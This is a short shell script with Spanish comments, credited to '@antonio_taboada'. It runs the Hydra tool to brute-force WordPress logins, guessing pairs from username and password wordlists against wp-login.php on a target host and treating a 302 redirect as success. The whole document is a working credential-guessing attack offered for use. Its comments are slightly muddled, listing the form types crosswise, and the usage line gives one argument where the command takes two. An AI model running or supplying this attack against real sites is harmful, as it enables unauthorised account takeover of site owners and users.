# Script basico para fuerza bruta http con hydra en  WordPress version 6.9
# Uso.: sh brutehttp8.sh fqdn
# POST http-get-form  GET http-post-form 
# @antonio_taboada

hydra -L usuarios0.txt -P claves0.txt $1 $2 https-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:S=302" \
-t 4 -w 10 -V
